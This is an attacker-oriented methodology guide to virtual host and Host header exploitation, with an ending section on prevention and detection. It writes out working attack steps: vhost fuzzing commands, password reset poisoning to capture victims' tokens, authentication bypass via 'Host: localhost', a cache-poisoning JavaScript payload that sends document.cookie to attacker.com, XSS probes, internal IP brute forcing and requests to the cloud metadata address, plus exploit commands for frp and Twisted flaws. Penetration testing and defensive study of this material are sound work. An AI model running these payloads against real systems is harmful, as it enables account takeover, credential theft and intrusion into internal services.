# Complete Methodology for VHost Exploitation

## Table of Contents
1. Understanding the Core Vulnerability
2. Discovery and Enumeration Phase
3. Exploitation Techniques
4. Real-World Exploit Examples
5. Testing Methodology with Burp Suite
6. Framework-Specific Exploits
7. Prevention and Mitigation


## 1. Understanding the Core Vulnerability

### 1.1 What is a Virtual Host?

Virtual hosting is a technique where a single web server hosts multiple websites on the same IP address and port . When you visit a website, the domain name gets resolved to an IP address through DNS. However, because multiple websites share the same IP, the server looks at the `Host` header in your HTTP request to determine which website to serve .

**How it works in practice:**

When you create two websites on the same server:
- Site A: `pikachu.com` on port 80
- Site B: `dvwa.com` on port 80

Both resolve to the same IP address. The server examines the `Host` header value to route your request to the correct website .

### 1.2 Why This Becomes a Security Problem

The `Host` header is entirely controlled by the client (you, the attacker). If the server blindly trusts this header without proper validation, several attack vectors become possible:
- Password reset poisoning
- Authentication bypass
- Web cache poisoning
- Server-Side Request Forgery (SSRF)
- Virtual host confusion attacks


## 2. Discovery and Enumeration Phase

Before exploiting, you must discover which virtual hosts exist on the target server.

### 2.1 Using ffuf for VHost Discovery

```bash
# Basic vhost fuzzing - replaces FUZZ with each wordlist entry
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://10.10.10.10 -H "Host: FUZZ.target.com" -fs 0

# Filter out false positives by response size
ffuf -w wordlist.txt -u http://10.10.10.10 -H "Host: FUZZ.target.com" -fs 4242

# With HTTPS and status code filtering
ffuf -w wordlist.txt -u https://10.10.10.10 -H "Host: FUZZ.target.com" -fc 400,404
```

**Why filtering matters:** The initial scan will return many results, but most are false positives showing a default response page. Filtering by the consistent size of that default page (using `-fs`) reveals only the valid vhosts .

### 2.2 Using gobuster

```bash
# Vhost mode with domain specification
gobuster vhost -u http://target.com -w wordlist.txt --domain target.com --append-domain

# Exclude responses with specific content length (false positives)
gobuster vhost -u http://target.com -w wordlist.txt --exclude-length 0
```

### 2.3 Using Burp Suite Intruder

Burp Suite is particularly effective for manual testing and fine-tuned exploitation:

1. Send any request to the target to Intruder (Ctrl+I)
2. Set payload position in the `Host` header: `Host: §FUZZ§.target.com`
3. Load your wordlist in the Payloads tab
4. Configure attack type: "Sniper"
5. Start the attack and analyze response sizes and status codes

**Pro tip:** Sort results by response length. Valid vhosts typically have different content lengths than the default response.

### 2.4 Finding Vhosts Without DNS Records

```bash
# Extract hostnames from SSL certificates (often reveals internal hosts)
echo | openssl s_client -connect 10.10.10.10:443 2>/dev/null | \
  openssl x509 -noout -text | grep -oP '(?<=DNS:)[^,]+'

# Use nmap's SSL certificate script
nmap --script ssl-cert -p 443 10.10.10.10

# Test common internal hostnames manually
for host in admin dev staging test api internal portal; do
  curl -s -o /dev/null -w "%{http_code} - $host.target.com\n" \
    -H "Host: $host.target.com" http://10.10.10.10
done
```


## 3. Exploitation Techniques

### 3.1 Password Reset Poisoning

This is one of the most practical and dangerous vhost attacks. The vulnerability occurs when an application generates a password reset link using the value from the `Host` header instead of a trusted, configured value .

**How the attack works:**

1. The victim requests a password reset
2. The server generates a unique reset token
3. The server constructs a reset link using the `Host` header value from the request
4. If an attacker can control the `Host` header, they can make the server send the reset link to their own server
5. The attacker captures the reset token and uses it to change the victim's password

**Step-by-step exploitation:**

**Step 1:** Intercept the password reset request in Burp Suite

**Step 2:** Modify the `Host` header to point to your attack server:
```
POST /forgot-password HTTP/1.1
Host: attacker-server.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

email=victim@example.com
```

**Step 3:** Forward the request. The server will generate a reset token and send the reset link to the email address associated with the victim's account.

**Step 4:** The email will contain a link like: `https://attacker-server.com/reset?token=UNIQUE_TOKEN_VALUE`

**Step 5:** Monitor your attack server's access logs to capture the token.

**Step 6:** Use the captured token to construct the legitimate reset link and change the victim's password.

**Real example from Burp Suite Academy:** In the basic password reset poisoning lab, intercepting the forgot password request and changing the `Host` header to a Collaborator domain caused the reset link to be delivered to the attacker's server, enabling account takeover .

### 3.2 Host Header Authentication Bypass

Many applications restrict access to administrative interfaces by checking the `Host` header against an expected value like `localhost` or `127.0.0.1` .

**Exploitation:**

```http
GET /admin HTTP/1.1
Host: localhost
```

**Why this works:** The server logic might check: `if (Host == "localhost") { allow_access() }` instead of properly validating the source IP address or using proper authentication mechanisms.

**Manual testing approach:**
1. Access `/admin` with the normal Host header (likely returns 403 Forbidden)
2. Change the `Host` header to `localhost`
3. Change the `Host` header to `127.0.0.1`
4. Change the `Host` header to the server's internal IP address
5. Change the `Host` header to an empty value

If any of these grant access, you've found an authentication bypass.

### 3.3 Web Cache Poisoning via Host Header

Modern web applications use caching servers (like CDNs) to improve performance. If a cache server uses the `Host` header as part of its cache key but the backend application processes a different value, poisoning becomes possible .

**The attack flow:**

1. Attacker sends a request with a malicious `Host` header to the cache server
2. The cache server stores the response keyed by the malicious `Host` value
3. The backend server processes the request and generates a response containing attacker-controlled content
4. When any user requests the same URL with a matching `Host` header, they receive the poisoned (malicious) response

**Practical example with JavaScript injection:**

**Step 1:** Find a cached resource (look for `Cache-Control` headers in responses)

**Step 2:** Create a malicious JavaScript file on your attack server:
```javascript
// hosted at https://attacker.com/evil.js
document.write('<img src="https://attacker.com/steal?cookie=' + document.cookie + '">');
```

**Step 3:** Poison the cache by requesting a JavaScript resource with a modified `Host` header:
```http
GET /static/main.js HTTP/1.1
Host: attacker.com
```

**Step 4:** If the cache server uses the `Host` header in its cache key and the backend allows Host header injection, the response may include your malicious JavaScript.

**Step 5:** When legitimate users request `/static/main.js`, they receive the poisoned version.

**Advanced technique - duplicate Host header:** Some servers behave differently when presented with two `Host` headers. The cache server might use the first one for caching, while the backend uses the second for routing .

### 3.4 SSRF via Host Header

When a server uses the `Host` header value to make internal requests (for APIs, microservices, or internal resources), you can manipulate it to access internal systems .

**Detection using Burp Collaborator:**

**Step 1:** Open Burp Collaborator client (Burp menu -> Burp Collaborator client)

**Step 2:** Click "Copy to clipboard" to get a unique Collaborator domain

**Step 3:** Intercept any request to the target and change the `Host` header to your Collaborator domain

**Step 4:** Send the request and check Collaborator for any DNS or HTTP interactions

**Step 5:** If you see interactions, the server is making requests based on the `Host` header value

**Exploitation - internal IP brute forcing:**

Once SSRF is confirmed, you can brute force internal IP addresses to find internal services:

**Using Burp Intruder:**
1. Set the `Host` header value as the payload position: `Host: 192.168.0.§1§`
2. Configure payload type: "Numbers" with range 1-255
3. Set attack type: "Sniper"
4. Monitor responses - different response sizes or status codes indicate active internal hosts

**Real example from Burp Suite Academy:** In the "SSRF via flawed request parsing" lab, changing the request line to an absolute URL bypassed validation:
```http
GET http://burpcollaborator.net/ HTTP/1.1
Host: something
```
This technique forced the server to make a request to the Collaborator domain, confirming the SSRF vulnerability .


## 4. Real-World Exploit Examples from Past Years

### 4.1 frp Authentication Bypass (GHSA-pq96-pwvg-vrr9) - 2026

**Affected versions:** frp 0.43.0 through 0.68.0

**Vulnerability summary:** Authentication bypass in HTTP vhost routing when `routeByHTTPUser` is used for access control .

**Technical root cause:** The routing logic uses the username from the `Proxy-Authorization` header to select the backend, while the authentication check uses credentials from the standard `Authorization` header. These two sources can be different .

**Attack scenario:**

A protected proxy is configured with:
- `routeByHTTPUser = "alice"`
- `httpUser = "alice"`
- `httpPassword = "secret"`

**Normal (successful) authentication:**
```bash
curl --proxy-user alice:secret http://example.test/
# Returns: 200 OK, PRIVATE data
```

**Attack (bypass) request:**
```bash
curl --proxy-user alice:wrongpassword http://example.test/
# Still returns: 200 OK, PRIVATE data
```

**Why this works:** The system routes based on the username "alice" from `Proxy-Authorization` but doesn't properly validate the password against the same source .

**Impact:** Unauthorized access to protected backends including:
- Private application endpoints
- Internal administration panels
- Loopback-only services
- Development interfaces

**Downstream impact chain:** If the bypassed backend is an frpc admin API without separate authentication, an attacker could create additional proxies, potentially exposing Docker's Unix socket and enabling host-level command execution .

**Fix:** Update to frp version 0.68.1 or later where authentication uses the same credential source as route selection.

### 4.2 Twisted NameVirtualHost Host Header Injection (CVE-2022-39348) - 2022

**Affected versions:** Twisted 0.9.4 through 22.10.0

**Vulnerability summary:** When the Host header doesn't match any configured virtual host, `twisted.web.vhost.NameVirtualHost` returns a `NoResource` that renders the Host header unescaped into the 404 response, allowing HTML and script injection .

**Vulnerable configuration example:**
```python
from twisted.web.server import Site
from twisted.web.vhost import NameVirtualHost

resource = NameVirtualHost()
site = Site(resource)
```

**Proof of concept:**
```bash
curl -H "Host: <h1>INJECTED</h1>" http://localhost:8080/
```

The server responds with a 404 page containing the unescaped HTML, causing the browser to render `<h1>INJECTED</h1>` as an actual heading .

**Exploitation scenario:** While the vulnerability requires the ability to modify the Host header (suggesting the attacker already has a privileged position), it can be chained with other vulnerabilities. For example, if an attacker can cause a victim to click a link with a malicious Host header (via email or other vector), the injected script executes in the victim's browser context .

**Real-world deployment impact:** The vulnerability affected Debian 11 bullseye installations of Twisted until version 20.3.0-7+deb11u2 .

**Fix:** Update to Twisted version 22.10.0 or later.

### 4.3 TLS Session Ticket Confusion (STEK Attack) - 2025

**Research presentation:** USENIX Security Symposium 2025

**Vulnerability summary:** TLS session resumption in virtual hosting can introduce session ticket confusion vulnerabilities, enabling bypass of both server and client authentication .

**What are Session Tickets?** Session tickets (RFC 5077) allow TLS connections to resume without a full handshake. The server encrypts session state with a Session Ticket Encryption Key (STEK) and gives the ticket to the client. On resumption, the client returns the ticket .

**The vulnerability:** In virtual hosting environments, multiple virtual hosts may share the same STEK but must remain securely isolated. The research demonstrated that all four major implementations analyzed (Apache, nginx, OpenLiteSpeed, and Caddy) were vulnerable to client authentication bypasses .

**Large-scale findings:** Large-scale scans identified six clusters of vulnerable providers, including Fastly, susceptible to server authentication bypasses .

**Attack impact:**
- Passive decryption of TLS session traffic
- Server impersonation
- Breaking forward secrecy guarantees

**Previous related finding (2023):** A large-scale analysis of TLS session tickets revealed that 1.9% of the Tranco Top 100k servers used an all-zero STEK, primarily within the Amazon AWS ecosystem. This allowed passive traffic decryption for affected servers .

**Vulnerable AWS implementation:** AWS servers used AES-256-CBC to encrypt tickets with an all-zero STEK. The issue was traced to an error in key rotation and was promptly resolved after disclosure .

**Vulnerable Stackpath implementation:** Twenty Stackpath hosts used an all-zero STEK and HMAC key with AES-128-CBC encryption. Interestingly, only some tickets were encrypted with the weak STEK, and all affected servers were hosted on the same IP address hosting 171 domains .

**Current status:** The research team has not yet released a public scanning tool to test for this vulnerability .


## 5. Complete Testing Methodology with Burp Suite

### 5.1 Setting Up Your Testing Environment

**Required tools:**
- Burp Suite Professional (or Community with manual testing)
- Target application access
- Attack server (can be Burp Collaborator for testing)

### 5.2 Phase 1: Discovery Testing

**Step 1: Baseline request capture**
1. Configure Burp to intercept traffic
2. Browse the target application normally
3. Observe the `Host` header in each request

**Step 2: Fuzz the Host header**
1. Send a request to Intruder (Ctrl+I)
2. Highlight the Host header value
3. Click "Add §" to set payload position
4. In Payloads tab, load a subdomain wordlist
5. Configure Grep - Extract to capture response differences
6. Start attack and sort by response length

**Step 3: Analyze results**
- Responses with different content lengths than baseline are candidates
- Status code 200 responses indicate valid vhosts
- Different response bodies indicate different applications

### 5.3 Phase 2: Vulnerability Testing

**Test 1: Password reset functionality**

1. Locate the password reset/forgot password function
2. Intercept the request when submitting a valid email
3. Change the `Host` header to your Burp Collaborator domain
4. Forward the request
5. Check Collaborator for any interactions
6. If a reset link appears in Collaborator, the application is vulnerable

**Test 2: Authentication bypass**

1. Identify restricted areas (/admin, /console, /internal)
2. Intercept the request to the restricted area
3. Test these `Host` header values systematically:
   - `localhost`
   - `127.0.0.1`
   - `0.0.0.0`
   - The server's internal IP (from network enumeration)
   - `[::1]` (IPv6 localhost)
   - Empty value
   - The actual domain name of the target

**Test 3: SSRF detection**

1. Using Burp Collaborator (or Canarytokens for free alternative)
2. Change `Host` header to your Collaborator domain
3. Look for DNS lookups or HTTP requests to your domain
4. If detected, the server is making requests based on the Host header

**Test 4: Cache poisoning**

1. Identify resources with cache headers (`Cache-Control: public`, `max-age`)
2. Intercept request to cached resource
3. Change `Host` header to your attack server
4. Monitor if the response changes
5. Request the resource again with normal `Host` header to see if cache is poisoned

### 5.4 Phase 3: Advanced Exploitation

**Exploiting SSRF to access internal services:**

Once SSRF is confirmed:
1. Target common internal IP ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
2. Use Intruder to brute force IP addresses in the `Host` header
3. Look for responses indicating active services
4. Access internal admin panels, APIs, or cloud metadata services

**Cloud metadata service exploitation:**
```http
GET / HTTP/1.1
Host: 169.254.169.254
```
This can expose cloud instance credentials if the server proxies requests.

### 5.5 Automated Scanning Tools

**For comprehensive testing, use specialized tools:**

```bash
# Virtual Host Discovery Tool
ruby scan.rb --ip=192.168.1.101 --host=domain.tld

# VHosts Sieve - finds vhosts in non-resolvable domains
python3 vhosts-sieve.py -d domains.txt -o vhosts.txt

# HostHunter - discovers hostnames from IP ranges
python3 hosthunter.py targets.txt -o hosts.txt
```


## 6. Framework-Specific Exploits

### 6.1 Apache HTTP Server

**Vulnerability (CVE-2025):** In Apache versions 2.4.35 through 2.4.63, an access control bypass exists in some mod_ssl configurations when multiple virtual hosts use different trusted client certificates and `SSLStrictSNIVHostCheck` is not enabled.

**Exploitation:** A client trusted to access one virtual host may gain unauthorized access to another virtual host.

**Mitigation:** Update to Apache 2.4.64+ and enable `SSLStrictSNIVHostCheck on`.

### 6.2 Nginx

**STEK vulnerability (2025):** Nginx was found vulnerable to client authentication bypasses through TLS session ticket confusion .

**Testing approach:** Monitor session resumption behavior across different virtual hosts on the same nginx server.

### 6.3 Python Twisted Applications

**CVE-2022-39348 exploitation:** Applications using `twisted.web.vhost.NameVirtualHost` are vulnerable to HTML injection through the Host header.

**Testing for Twisted applications:**
```bash
curl -H "Host: <script>alert('XSS')</script>" http://target.com/
```
If the error page executes JavaScript, the application is vulnerable.

### 6.4 frp (Fast Reverse Proxy)

**Affected configurations:** Any deployment using `routeByHTTPUser` with `httpUser` and `httpPassword`.

**Exploitation command:**
```bash
curl --proxy-user known_username:any_password http://protected-backend/
```

**Detection:** Review frps configuration files for `routeByHTTPUser` directives.

### 6.5 Cloud Providers (AWS, Stackpath)

**Session ticket vulnerability (2023):** 1,903 AWS servers and 20 Stackpath servers were found using all-zero STEKs, allowing passive traffic decryption .

**Indicators of compromise:**
- Unusual TLS session resumption behavior
- Session tickets that decrypt predictably

**Mitigation:** Cloud providers have resolved these specific issues, but testing your own deployments for weak STEKs is recommended.


## 7. Prevention and Mitigation

### 7.1 For Developers

**Never trust the Host header:**
- Use a trusted, configured SERVER_NAME or similar variable
- Validate the Host header against a whitelist of allowed domains
- Reject requests with unrecognized Host headers

**Secure configuration examples:**

**Apache:**
```apache
UseCanonicalName On
ServerName trusted-domain.com
<VirtualHost *:80>
    ServerName trusted-domain.com
    ServerAlias www.trusted-domain.com
</VirtualHost>
```

**Nginx:**
```nginx
server {
    listen 80;
    server_name trusted-domain.com www.trusted-domain.com;
    if ($host !~* ^(trusted-domain\.com|www\.trusted-domain\.com)$) {
        return 403;
    }
}
```

**For password reset functionality:**
```python
# NEVER do this:
reset_link = f"https://{request.headers['Host']}/reset?token={token}"

# ALWAYS do this:
reset_link = f"https://{config.TRUSTED_DOMAIN}/reset?token={token}"
```

### 7.2 For Security Testers

**Testing checklist:**
- [ ] Enumerate all vhosts on the target IP
- [ ] Test each vhost for password reset poisoning
- [ ] Test authentication bypass via localhost Host header
- [ ] Test SSRF via Host header manipulation
- [ ] Test cache poisoning on cached resources
- [ ] Review SSL certificates for additional hostnames
- [ ] Check for framework-specific vulnerabilities

### 7.3 Detection and Monitoring

**Log analysis:**
- Monitor for unusual Host header values in access logs
- Alert on Host header values containing localhost, internal IPs, or external domains
- Track password reset requests with mismatched Host headers

**WAF rules:**
- Block Host headers containing XSS payloads (`<script>`, `javascript:`)
- Block Host headers pointing to non-company domains for sensitive endpoints
- Implement rate limiting on Host header fuzzing attempts


## 8. Tools Reference Summary

| Tool | Purpose | Example Command |
|------|---------|-----------------|
| ffuf | Vhost fuzzing | `ffuf -w wordlist.txt -u http://target -H "Host: FUZZ.target.com" -fs 0` |
| gobuster | Vhost enumeration | `gobuster vhost -u http://target -w wordlist.txt --domain target.com` |
| wfuzz | Vhost fuzzing | `wfuzz -w wordlist.txt -H "Host: FUZZ.target.com" --hc 404,403 http://target` |
| Burp Suite | Manual testing & exploitation | Intruder for fuzzing, Collaborator for SSRF |
| openssl | Certificate analysis | `openssl s_client -connect target:443 -servername target` |
| nmap | SSL certificate extraction | `nmap --script ssl-cert -p 443 target` |

## 9. Key Takeaways

1. **The Host header is client-controlled** - never trust it for security decisions
2. **Password reset poisoning is the most critical impact** - leads to full account takeover
3. **Always filter false positives** - default responses hide valid vhosts
4. **Check SSL certificates** - they often reveal internal hostnames
5. **Test all discovered vhosts** - each may have different security postures
6. **Recent exploits exist** - frp (2026), STEK (2025), Twisted (2022)
7. **Use Burp Collaborator** - essential for detecting blind SSRF
8. **Cache poisoning can have widespread impact** - affects all users
9. **Cloud environments are particularly vulnerable** - metadata services at 169.254.169.254
10. **Always validate findings** - add discovered hosts to /etc/hosts and test manually
